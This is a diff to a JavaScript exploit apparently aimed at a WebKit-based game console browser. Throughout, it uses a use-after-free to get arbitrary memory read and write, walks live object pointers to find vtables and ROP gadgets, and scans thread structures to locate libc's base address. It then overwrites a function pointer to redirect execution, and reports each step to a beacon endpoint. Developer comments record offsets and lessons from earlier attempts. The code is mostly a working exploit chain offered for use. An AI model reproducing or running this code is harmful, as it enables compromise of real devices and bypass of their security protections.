@@ -6166,27 +6166,23 @@ function _startWsShell(){
       }
 
       case 'lcbase':{
-        /* v8 THE TWO-TROVE HUNT (the session-167 verdict: the main
-         * module text is XO too - ALL module text in this process is
-         * execute-only; the entry probe died at AT_ENTRY=0x5720070 -
-         * route closed cleanly). READABLE TROVES ONLY:
-         * TROVE A - THE UAF WALK: our own FontFace machinery holds
-         * SELF/MBUF (the reclaimed CSSFontFace buffer, live). The
-         * engine wrote L1 (hash-table ptr) at +0x58 and L2
-         * (WeakPtrImpl*) at +0x68 (the ZigZagBoi1 leak: their walk =
-         * hash -> IM -> FO -> VP, all live pointers). 3-5 ARW reads
-         * -> VP (the CSSFontFaceSet vtable) + the 9 slots -> their
-         * device-confirmed gadget offsets go LIVE (ret@s0-1,
-         * pop rbp@s0-2, pop rdi;pop rbp;ret@s0-4 - VP-relative).
-         * TROVE B - THE WEBKIT DATA BAND: [S.BASE+0x3F00000,
-         * +0x4300000) (V83-proven readable, minus the V84 hole
-         * [+0x4018000,+0x401C000)): scan for (a) qwords pointing
-         * into WebKit's lower regions (the NID name-pointer arrays -
-         * the same structure as the corpus libc's import window), in
-         * DENSE RUNS = the Sony import tables; (b) '.spr' / 'libk'
-         * ASCII (the linker registry strings); (c) the parallel slot
-         * arrays whose values are foreign 0x8-band pointers = THE
-         * LIVE RESOLVED IMPORTS -> the 12-RVA oracle -> the ONE
+        /* v9 THE LIVE-POINTER HUNT (session-169 lessons: the WeakPtr
+         * m_ptr is at +0x10 NOT +0x8 (their geometry doc: +0x00
+         * m_refCount, +0x04 m_ownerThread, +0x08 m_areThreadChecks,
+         * +0x10 m_ptr, +0x18 m_thread - their step-2 reads IM+8 for
+         * 16 bytes, m_ptr is the SECOND qword); the V83 data band is
+         * NOT boot-stable (BASE+0x3F00000 unmapped this boot - the
+         * band scan dropped). THE POINTER SOURCES, ALL LIVE:
+         * (A) THE UAF WALK: MBUF (v688_buf cache) -> L1 at +0x58 (the
+         * live hash table) -> the cage-band bucket = the WeakPtrImpl
+         * -> m_ptr@+0x10 = FO (cage) -> [FO] = VP (0x8-band rodata,
+         * readable) -> the 9 slots -> ZigZagBoi1's confirmed gadgets
+         * LIVE. (B) THE PTHREAD STRUCTS: the 0x88-band values in
+         * every harvest = live struct pthread (0x880 bytes of
+         * function pointers: startfunc/cleanup/wakeup - the WORKER
+         * threads were created by DIFFERENT MODULES) + the stacks
+         * below them -> module-band pointers -> the oracle pool.
+         * (C) the harvest as before. THE 12-RVA ORACLE -> the ONE
          * verify (+0x1179A8/+0x117AE8) -> the RAX probe. */
         if(!S.neEntry||!S.batt){reply.err='No NE target';break;}
         function LB(s){try{var x=new XMLHttpRequest();x.open('POST','/beacon/'+encodeURIComponent('LCB-'+s),false);x.send();}catch(e){}}
@@ -6218,151 +6214,152 @@ function _startWsShell(){
             if(!(canL>0x1000000n)){reply.err='canary fail';break;}
           }
           reply.lk='0x'+lkBL.toString(16);
-          /* (2) THE UAF WALK (TROVE A - live pointers, all safe) */
+          reply.mainPt='0x'+((typeof ptL!=='undefined')?ptL.toString(16):'0');
+          var foreign9=[];
+          function addF(v){
+            if(v<0x802000000n||v>=0x880000000n)return;
+            if(v>=lkBL&&v<lkBL+0x200000n)return;
+            if(S.BASE&&v>=S.BASE&&v<S.BASE+0x8000000n)return;
+            for(var i9=0;i9<foreign9.length;i9++)if(foreign9[i9]===v)return;
+            foreign9.push(v);
+          }
+          /* (2) THE UAF WALK (fixed: m_ptr at +0x10) */
           try{
             var MBUF=0n;
-            try{MBUF=BigInt('0x'+(localStorage.getItem('v688_buf')||'0'));}catch(eL8){}
-            LB('a mbuf='+(MBUF?'0x'+MBUF.toString(16):'MISSING'));
+            try{MBUF=BigInt('0x'+(localStorage.getItem('v688_buf')||'0'));}catch(eL9){}
+            LB('a mbuf=0x'+MBUF.toString(16));
             if(MBUF){
               var L1=S.absRead(MBUF+0x58n,8)[0];
-              var L2=S.absRead(MBUF+0x68n,8)[0];
-              LB('b L1=0x'+L1.toString(16)+' L2=0x'+L2.toString(16));
-              reply.L1='0x'+L1.toString(16);reply.L2='0x'+L2.toString(16);
-              /* the hash table at L1-0x10: 8 buckets - find the client
-               * WeakPtrImpl (a CAGE-band pointer, like L1 itself - the
-               * session-168 lesson: the first bucket held a WebKit TEXT
-               * pointer (0x806847ce0) and the loose range filter took
-               * it -> a text-band FO -> the VP read hit XO text = death.
-               * STRICT BANDS: IM = cage [0x1000000000,0x1010000000);
-               * FO (=[IM+8]) = cage; VP (=[FO]) = the 0x8-band; only
-               * then read the vtable (rodata, readable). ALL candidates
-               * tried; failures skipped, never dereferenced blind. */
-              var IM=0n;
+              LB('b L1=0x'+L1.toString(16));
+              reply.L1='0x'+L1.toString(16);
               if(L1>=0x1000000000n&&L1<0x1010000000n){
-                var ht=S.absRead(L1-0x10n,0x50);
-                var walkOK=false;
-                for(var bi8=0;bi8<ht.length&&!walkOK;bi8++){
-                  var bv=ht[bi8];
-                  if(bv<0x1000000000n||bv>=0x1010000000n)continue;
+                var ht9=S.absRead(L1-0x10n,0x50);
+                var found9=false;
+                for(var bi9=0;bi9<ht9.length&&!found9;bi9++){
+                  var bv9=ht9[bi9];
+                  if(bv9<0x1000000000n||bv9>=0x1010000000n)continue;
                   try{
-                    var im8=S.absRead(bv,0x10);
-                    var FOc=im8[1];
-                    if(FOc<0x1000000000n||FOc>=0x1010000000n)continue;
-                    var VPc=S.absRead(FOc,8)[0];
-                    if(VPc<0x800000000n||VPc>=0x880000000n)continue;
-                    IM=bv;walkOK=true;
-                    LB('c IM=0x'+IM.toString(16)+' FO=0x'+FOc.toString(16)+' VP=0x'+VPc.toString(16));
-                    reply.IM='0x'+IM.toString(16);reply.FO='0x'+FOc.toString(16);
-                    var VP=VPc;
-                    reply.VP='0x'+VP.toString(16);
-                    LB('e VP delta-from-BASE=0x'+(VP-S.BASE).toString(16));
-                    var vt=S.absRead(VP,0x48);
-                    var slots=[];
-                    for(var sI8=0;sI8<9;sI8++)slots.push('0x'+vt[sI8].toString(16));
-                    reply.vtable=slots;
-                    var s0=vt[0];
+                    var w9=S.absRead(bv9,0x18);
+                    var FO9=w9[2];  /* m_ptr at +0x10 */
+                    if(FO9<0x1000000000n||FO9>=0x1010000000n)continue;
+                    var VP9=S.absRead(FO9,8)[0];
+                    if(VP9<0x800000000n||VP9>=0x880000000n)continue;
+                    found9=true;
+                    LB('c IM=0x'+bv9.toString(16)+' FO=0x'+FO9.toString(16)+' VP=0x'+VP9.toString(16));
+                    reply.IM='0x'+bv9.toString(16);reply.FO='0x'+FO9.toString(16);
+                    reply.VP='0x'+VP9.toString(16);
+                    LB('e VP delta-from-BASE=0x'+(VP9-S.BASE).toString(16));
+                    var vt9=S.absRead(VP9,0x48);
+                    var slots9=[];
+                    for(var sI9=0;sI9<9;sI9++)slots9.push('0x'+vt9[sI9].toString(16));
+                    reply.vtable=slots9;
+                    var s0=vt9[0];
                     if(s0>0x800000000n){reply.gadgets={ret:'0x'+(s0-1n).toString(16),popRbp:'0x'+(s0-2n).toString(16),popRdiPopRbpRet:'0x'+(s0-4n).toString(16)};}
-                    LB('f slots '+slots.join(' '));
-                  }catch(eWb){LB('c cand 0x'+bv.toString(16)+' failed');}
+                    LB('f slots '+slots9.join(' '));
+                  }catch(eWc){}
                 }
-                if(!walkOK)LB('c no valid walk chain in buckets');
+                if(!found9)LB('c no chain (m_ptr@+0x10 tried on all cage buckets)');
               }
             }
-          }catch(eW8){LB('a walk fault: '+String(eW8&&eW8.message?eW8.message:'?'));}
-          /* (3) TROVE B: THE WEBKIT DATA BAND SCAN */
-          var foreign8=[];
+          }catch(eW9){LB('a walk fault');}
+          /* (3) THE PTHREAD-STRUCT SCAN (the 0x88-band live structs) */
           try{
-            var bandLo=S.BASE+0x3F00000n,bandHi=S.BASE+0x4300000n;
-            var holeLo=S.BASE+0x4018000n,holeHi=S.BASE+0x401C000n;
-            var nameRuns=[];  /* dense runs of pointers into WebKit lower regions */
-            var sprHits=[];
-            var cur8=[];
-            for(var off8=0;off8<0x400000;off8+=0x1000){
-              var addr8=bandLo+BigInt(off8);
-              if(addr8>=holeLo&&addr8<holeHi)continue;
-              var ws8=S.absRead(addr8,0x1000);
-              for(var wi8=0;wi8<ws8.length;wi8++){
-                var v8q=ws8[wi8];
-                /* (a) self-pointers into WebKit lower regions */
-                if(v8q>=S.BASE&&v8q<S.BASE+0x3F00000n){
-                  if(cur8.length&&((addr8+BigInt(wi8*8))-cur8[cur8.length-1].at)<=0x40n){cur8.push({at:addr8+BigInt(wi8*8),v:v8q});}
-                  else{if(cur8.length>=6)nameRuns.push(cur8.slice());cur8=[{at:addr8+BigInt(wi8*8),v:v8q}];}
-                } else {
-                  if(cur8.length>=6)nameRuns.push(cur8.slice());
-                  cur8=[];
+            var pts9=[];
+            if(typeof ptL!=='undefined'&&ptL>0n)pts9.push(ptL);
+            /* harvest the 0x88-band values from the stk band */
+            var pg9=(cfrL/0x4000n)*0x4000n;
+            var seenP9={};
+            function collectP9(start,len){
+              for(var offP=0;offP<len;offP+=0x1000){
+                var wsP;
+                try{wsP=S.absRead(start+BigInt(offP),0x1000);}catch(eP){return;}
+                for(var wiP=0;wiP<wsP.length;wiP++){
+                  var vP=wsP[wiP];
+                  if(vP>=0x880000000n&&vP<0x900000000n){
+                    var kP=vP.toString(16);
+                    if(!seenP9[kP]){seenP9[kP]=1;pts9.push(vP);}
+                  }
                 }
-                /* (b) foreign sysmod pointers */
-                if(v8q>=0x802000000n&&v8q<0x880000000n&&!(v8q>=lkBL&&v8q<lkBL+0x200000n)&&!(v8q>=S.BASE&&v8q<S.BASE+0x8000000n)){
-                  var d8=false;for(var dd8=0;dd8<foreign8.length;dd8++)if(foreign8[dd8]===v8q){d8=true;break;}
-                  if(!d8)foreign8.push(v8q);
+              }
+            }
+            collectP9(pg9,0x8000);
+            for(var dP9=1;dP9<=4;dP9++){try{collectP9(pg9-BigInt(dP9*0x1000),0x1000);}catch(eP2){}}
+            LB('g pthread ptrs n='+pts9.length);
+            reply.ptPtrs=pts9.slice(0,12).map(function(p){return '0x'+p.toString(16);});
+            /* scan each struct (0x880 bytes - LIVE, safe) + the stack page below */
+            for(var pi9=0;pi9<pts9.length&&pi9<8;pi9++){
+              var P9=pts9[pi9];
+              try{
+                var st9=S.absRead(P9,0x880);
+                for(var fi9=0;fi9<st9.length;fi9++)addF(st9[fi9]);
+                var below=S.absRead(P9-0x1000n,0x1000);
+                for(var fi2=0;fi2<below.length;fi2++)addF(below[fi2]);
+                LB('h struct 0x'+P9.toString(16)+' scanned');
+              }catch(eS9){LB('h struct 0x'+P9.toString(16)+' read fail');}
+            }
+            LB('i foreign pool n='+foreign9.length);
+          }catch(eP9t){LB('g ptscan fault');}
+          /* (4) the general harvest (oracle-only) */
+          try{
+            var seenH9={};
+            function collectH9(start,len){
+              for(var offH=0;offH<len;offH+=0x1000){
+                var wsH;
+                try{wsH=S.absRead(start+BigInt(offH),0x1000);}catch(eH){return;}
+                for(var wiH=0;wiH<wsH.length;wiH++){
+                  var vH=wsH[wiH];
+                  if(vH<0x802000000n||vH>=0x880000000n)continue;
+                  var kH=vH.toString(16);
+                  if(seenH9[kH])continue;
+                  seenH9[kH]=1;
+                  addF(vH);
                 }
-                /* (c) ASCII '.spr' (2e 73 70 72) at any byte offset in the qword */
-                var bQ8=[Number(v8q&0xFFn),Number((v8q>>8n)&0xFFn),Number((v8q>>16n)&0xFFn),Number((v8q>>24n)&0xFFn),Number((v8q>>32n)&0xFFn),Number((v8q>>40n)&0xFFn),Number((v8q>>48n)&0xFFn),Number((v8q>>56n)&0xFFn)];
-                for(var k8=0;k8<5;k8++){if(bQ8[k8]===0x2e&&bQ8[k8+1]===0x73&&bQ8[k8+2]===0x70&&bQ8[k8+3]===0x72){sprHits.push('0x'+(addr8+BigInt(wi8*8)).toString(16));break;}}
               }
-              if((off8&0x3FFFF)===0)LB('g scan +0x'+off8.toString(16));
             }
-            if(cur8.length>=6)nameRuns.push(cur8.slice());
-            reply.nameRuns=nameRuns.slice(0,20).map(function(r){return {at:'0x'+r[0].at.toString(16),n:r.length,first:'0x'+r[0].v.toString(16)};});
-            reply.sprxHits=sprHits.slice(0,40);
-            reply.foreignN=foreign8.length;
-            LB('h nameRuns='+nameRuns.length+' sprx='+sprHits.length+' foreign='+foreign8.length);
-            /* the densest name-run = the NID array -> read its strings */
-            if(nameRuns.length){
-              nameRuns.sort(function(a,b2){return b2.length-a.length;});
-              var best8=nameRuns[0];
-              LB('i best run at=0x'+best8[0].at.toString(16)+' n='+best8.length);
-              var nids8=[];
-              for(var ni8=0;ni8<best8.length&&ni8<16;ni8++){
-                try{
-                  var sb8=S.absRead(best8[ni8].v,16);
-                  var by8=[];outer8:for(var q8=0;q8<sb8.length;q8++){var w8=sb8[q8];for(var kk8=0;kk8<8;kk8++){var c8=Number((w8>>BigInt(kk8*8))&0xFFn);if(c8===0)break outer8;if(c8<0x20||c8>0x7e)break outer8;by8.push(c8);}}
-                  var st8='';for(var s8=0;s8<by8.length;s8++)st8+=String.fromCharCode(by8[s8]);
-                  if(st8.length>=4)nids8.push(st8);
-                }catch(eS8){}
-              }
-              reply.nidSample=nids8;
-              LB('j nids: '+nids8.join(' '));
-            }
-          }catch(eB8){LB('g band fault: '+String(eB8&&eB8.message?eB8.message:'?'));}
-          /* (4) THE ORACLE over the band's foreign pointers */
-          var RVAS8=[0x42410n,0x37BF0n,0x366E0n,0x4CDB0n,0x4C3C0n,0x4C240n,0x4C1C0n,0x4C6E0n,0x4C6F0n,0x4C650n,0xB020n,0xB070n];
-          var tally8={},bestB8=0n,bestN8=0;
-          for(var pI8=0;pI8<foreign8.length;pI8++){
-            for(var rI8=0;rI8<RVAS8.length;rI8++){
-              var Bc8=foreign8[pI8]-RVAS8[rI8];
-              if(Bc8<0x802000000n||Bc8>=0x880000000n)continue;
-              if((Bc8&0x3fffn)!==0n)continue;
-              var kB8=Bc8.toString(16);
-              tally8[kB8]=(tally8[kB8]||0)+1;
-              if(tally8[kB8]>bestN8){bestN8=tally8[kB8];bestB8=Bc8;}
+            collectH9(pg9,0x8000);
+            for(var dH9=1;dH9<=6;dH9++){try{collectH9(pg9-BigInt(dH9*0x1000),0x1000);}catch(eH2){}}
+            LB('j pool total n='+foreign9.length);
+          }catch(eH3){}
+          /* (5) THE ORACLE */
+          var RVAS9=[0x42410n,0x37BF0n,0x366E0n,0x4CDB0n,0x4C3C0n,0x4C240n,0x4C1C0n,0x4C6E0n,0x4C6F0n,0x4C650n,0xB020n,0xB070n];
+          var tally9={},bestB9=0n,bestN9=0;
+          for(var pI9=0;pI9<foreign9.length;pI9++){
+            for(var rI9=0;rI9<RVAS9.length;rI9++){
+              var Bc9=foreign9[pI9]-RVAS9[rI9];
+              if(Bc9<0x802000000n||Bc9>=0x880000000n)continue;
+              if((Bc9&0x3fffn)!==0n)continue;
+              var kB9=Bc9.toString(16);
+              tally9[kB9]=(tally9[kB9]||0)+1;
+              if(tally9[kB9]>bestN9){bestN9=tally9[kB9];bestB9=Bc9;}
             }
           }
-          reply.oracle={base:'0x'+bestB8.toString(16),n:bestN8};
-          LB('k oracle best=0x'+bestB8.toString(16)+' n='+bestN8);
-          /* (5) THE VERIFY + RAX PROBE */
-          if(bestN8>=2){
-            LB('l verify 0x'+(bestB8+0x1179A8n).toString(16));
-            var gt8=S.absRead(bestB8+0x1179A8n,8)[0];
-            var te8=S.absRead(bestB8+0x117AE8n,8)[0];
-            reply.verify={gt:'0x'+gt8.toString(16),te:'0x'+te8.toString(16)};
-            LB('l gt=0x'+gt8.toString(16)+' te=0x'+te8.toString(16));
-            if(gt8===lkBL+0xB50n&&te8===lkBL+0x3F0n){
-              reply.libc='0x'+bestB8.toString(16);
-              LB('m *** LIBC CONFIRMED 0x'+bestB8.toString(16)+' ***');
+          reply.oracle={base:'0x'+bestB9.toString(16),n:bestN9};
+          reply.poolN=foreign9.length;
+          reply.pool=foreign9.slice(0,40).map(function(v){return '0x'+v.toString(16);});
+          LB('k oracle best=0x'+bestB9.toString(16)+' n='+bestN9);
+          /* (6) THE VERIFY + RAX PROBE */
+          if(bestN9>=2){
+            LB('l verify 0x'+(bestB9+0x1179A8n).toString(16));
+            var gt9=S.absRead(bestB9+0x1179A8n,8)[0];
+            var te9=S.absRead(bestB9+0x117AE8n,8)[0];
+            reply.verify={gt:'0x'+gt9.toString(16),te:'0x'+te9.toString(16)};
+            LB('l gt=0x'+gt9.toString(16)+' te=0x'+te9.toString(16));
+            if(gt9===lkBL+0xB50n&&te9===lkBL+0x3F0n){
+              reply.libc='0x'+bestB9.toString(16);
+              LB('m *** LIBC CONFIRMED 0x'+bestB9.toString(16)+' ***');
               try{
-                for(var zR8=0;zR8<4;zR8++)S.absWrite(S.fakeScope+BigInt(zR8*8),0n);
+                for(var zR9=0;zR9<4;zR9++)S.absWrite(S.fakeScope+BigInt(zR9*8),0n);
                 if(S.scopeSlot&&S.fakeScope&&S.scopeOrig)S.absWrite(S.scopeSlot,S.fakeScope);
-                var oF8=S.absRead(S.neEntry.addr+0x28n,8)[0];
-                S.absWrite(S.neEntry.addr+0x28n,bestB8+0x611e7n);
-                try{Math.round(-5.7);}catch(eM8){}
-                S.absWrite(S.neEntry.addr+0x28n,oF8);
+                var oF9=S.absRead(S.neEntry.addr+0x28n,8)[0];
+                S.absWrite(S.neEntry.addr+0x28n,bestB9+0x611e7n);
+                try{Math.round(-5.7);}catch(eM9){}
+                S.absWrite(S.neEntry.addr+0x28n,oF9);
                 if(S.scopeSlot&&S.scopeOrig)S.absWrite(S.scopeSlot,S.scopeOrig);
                 reply.raxAtEntry='0x'+S.absRead(S.fakeScope,8)[0].toString(16);
                 LB('n RAX-at-entry=0x'+reply.raxAtEntry);
-              }catch(eR8){}
+              }catch(eR9){}
             } else reply.err='verify mismatch';
-          } else reply.err='oracle n='+bestN8;
+          } else reply.err='oracle n='+bestN9;
           LB('z done');
         }catch(eZ){reply.err='lcbase fault: '+String(eZ&&eZ.message?eZ.message:'?');}
         break;
